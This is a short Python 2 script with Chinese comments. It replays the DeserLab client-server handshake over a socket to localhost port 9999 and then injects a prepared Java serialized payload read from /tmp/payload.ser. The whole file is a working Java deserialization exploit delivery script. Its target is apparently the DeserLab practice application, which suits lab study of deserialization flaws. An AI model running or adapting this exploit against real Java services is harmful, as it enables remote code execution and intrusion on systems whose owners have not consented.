import socket
import binascii

'''
通过对DeserLab server client交互过程数据包抓包，模拟发送数据包，并替换序列化数据
'''

with open("/tmp/payload.ser", 'r') as f:
    payload = f.read()
    
    s = socket.socket(family=socket.AF_INET, type = socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 9999))
    s.recv(1024)
    print "connect"
    bolb = "\xac\xed\x00\x05"
    s.sendall(bolb)
    s.recv(1024)
    print "header"
    s.recv(1024)
    bolb1 = "\x77\x04"
    s.sendall(bolb1)
    
    bolb2 = "\xf0\x00\xba\xaa"
    s.sendall(bolb2)
    s.recv(1024)
    print "2"
    s.recv(1024)
    bolb3 = "\x77\x02"
    s.sendall(bolb3)
    bolb4 = "\x01\x01"
    s.sendall(bolb4)
    print "name"
    bolb9 = "\x77\x04"
    s.sendall(bolb9)
    
    bolb5 = binascii.a2b_hex("00027875")
    s.sendall(bolb5)
    
    
    '''
    替换7372 ...部分
    '''
    bolb6 = payload[4:]
    s.sendall(bolb6)
    

    
    
    